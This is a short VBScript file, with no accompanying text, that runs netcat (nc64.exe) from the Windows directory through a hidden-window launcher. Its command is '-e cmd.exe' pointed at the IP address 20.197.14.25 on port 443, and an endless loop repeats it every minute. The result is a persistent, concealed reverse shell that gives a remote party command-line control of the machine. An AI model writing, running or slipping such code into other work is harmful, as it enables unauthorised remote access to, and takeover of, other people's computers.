Set objShell = CreateObject("WScript.Shell")

' Get the path to the Windows directory
customFolder = objShell.ExpandEnvironmentStrings("%WINDIR%")

' Define the command to run from the custom folder
commandToRun = """" & customFolder & "\Quiet.exe"" """ & customFolder & "\nc64.exe"" -e cmd.exe 20.197.14.25 443"""

' Loop indefinitely
Do
    ' Run the command
    objShell.Run commandToRun, 0, True
    
    ' Wait for 1 minute (60,000 milliseconds)
    WScript.Sleep 60000
Loop
